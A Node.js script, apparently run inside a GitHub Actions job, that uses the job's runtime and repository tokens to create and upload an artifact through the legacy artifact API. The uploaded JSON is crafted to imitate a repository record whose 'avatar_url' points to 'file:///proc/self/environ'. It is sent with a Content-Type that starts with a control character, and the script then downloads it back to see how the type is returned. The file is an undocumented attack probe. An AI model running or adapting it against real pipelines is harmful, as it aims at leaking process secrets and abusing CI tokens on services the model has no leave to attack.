import http from 'node:http';
import https from 'node:https';

const runtimeUrl = process.env.ACTIONS_RUNTIME_URL;
const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || '';
const runId = process.env.GITHUB_RUN_ID;
const repo = process.env.GITHUB_REPOSITORY;
const token = process.env.GITHUB_TOKEN;
const odd = '\u0085application/json';

function req(url, method = 'GET', body = null, headers = {}, redirect = 'follow') {
  return new Promise((resolve, reject) => {
    const t = new URL(url);
    const mod = t.protocol === 'https:' ? https : http;
    const r = mod.request(t, {method, headers, timeout: 30000}, (res) => {
      if (redirect === 'manual' && res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        res.resume();
        resolve({status: res.statusCode, headers: res.headers, rawHeaders: res.rawHeaders, body: Buffer.alloc(0), location: res.headers.location});
        return;
      }
      const c = [];
      res.on('data', (x) => c.push(x));
      res.on('end', () => resolve({status: res.statusCode, headers: res.headers, rawHeaders: res.rawHeaders, body: Buffer.concat(c)}));
    });
    r.on('error', reject);
    r.on('timeout', () => r.destroy(new Error('timeout')));
    r.on('response', undefined);
    if (body) r.write(body);
    r.end();
  });
}

function target(base, apiVersion) {
  return `${base.replace(/\/$/, '')}/_apis/pipelines/workflows/${runId}/artifacts?api-version=${apiVersion}`;
}

const createBase = target(runtimeUrl, '6.0-preview');
console.log('LEGACY2-ENV', JSON.stringify({
  runtimeUrlOrigin: (() => { try { return new URL(runtimeUrl).origin; } catch { return null; } })(),
  runtimeUrlLen: runtimeUrl.length,
  createBase,
}));

const names = [`legacyname-${runId}`, `legacy_${runId}`, `Legacy.${runId}`, `legacy${runId}`];
const out = {tries: []};
for (const name of names) {
  try {
    const body = JSON.stringify({Type: 'actions_storage', Name: name});
    const r = await req(createBase, 'POST', Buffer.from(body), {
      Authorization: `Bearer ${runtimeToken}`,
      Accept: 'application/json;api-version=6.0-preview',
      'Content-Type': 'application/json',
      'User-Agent': 'legacy2',
      'Content-Length': String(Buffer.byteLength(body)),
    });
    out.tries.push({name, status: r.status, ct: r.headers['content-type'], body: r.body.toString('utf8').slice(0, 300)});
    if (r.status === 200) {
      out.created = JSON.parse(r.body.toString('utf8'));
      break;
    }
  } catch (e) {
    out.tries.push({name, err: String(e).slice(0, 200)});
  }
}

if (out.created) {
  const file = Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/0/zip`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'legacy2', stargazers_count: 0,
  }));
  const uploadBase = out.created.fileContainerResourceUrl;
  out.fileContainer = uploadBase;
  const itemPath = `${out.created.name}/payload.json`;
  const url = new URL(uploadBase);
  url.searchParams.append('itemPath', itemPath);
  const up = await req(url.href, 'PUT', file, {
    Authorization: `Bearer ${runtimeToken}`,
    Accept: 'application/json;api-version=6.0-preview',
    'Content-Type': odd,
    'Content-Range': `bytes 0-${file.length - 1}/${file.length}`,
    'Content-Length': String(file.length),
    'User-Agent': 'legacy2',
  });
  out.upload = {status: up.status, ct: up.headers['content-type'], body: up.body.toString('utf8').slice(0, 200), urlKeys: [...new URL(uploadBase).searchParams.keys()]};

  const listUrl = new URL(uploadBase);
  listUrl.searchParams.append('itemPath', out.created.name);
  const list = await req(listUrl.href, 'GET', null, {
    Authorization: `Bearer ${runtimeToken}`,
    Accept: 'application/json;api-version=6.0-preview',
    'User-Agent': 'legacy2',
  });
  out.list = {status: list.status, body: list.body.toString('utf8').slice(0, 1200)};
  let items = null;
  try { items = JSON.parse(list.body.toString('utf8')); } catch {}
  if (items && Array.isArray(items.value)) {
    out.items = items.value.map((it) => ({path: it.path, fileLength: it.fileLength, contentType: it.contentType, itemType: it.itemType, hasLoc: Boolean(it.contentLocation)}));
    const item = items.value.find((it) => it.path && it.path.endsWith('payload.json')) || items.value[0];
    if (item && item.contentLocation) {
      const dl = await req(item.contentLocation, 'GET', null, {'User-Agent': 'legacy2'});
      const ct = dl.headers['content-type'] || '';
      out.download = {status: dl.status, ct, ctHex: Buffer.from(ct, 'latin1').toString('hex'), len: dl.body.length, match: dl.body.equals(file), head: dl.body.subarray(0, 60).toString('latin1')};
    }
  }
  // public REST artifact list
  try {
    const r = await req(`https://api.github.com/repos/${repo}/actions/runs/${runId}/artifacts?per_page=100`, 'GET', null, {
      Authorization: `Bearer ${token}`, Accept: 'application/vnd.github.v3+json', 'User-Agent': 'legacy2',
    });
    const j = JSON.parse(r.body.toString('utf8'));
    out.publicArtifacts = (j.artifacts || []).map((a) => ({id: a.id, name: a.name, size: a.size_in_bytes, expired: a.expired}));
  } catch (e) { out.publicErr = String(e).slice(0, 150); }
}
console.log('LEGACY2', JSON.stringify(out));
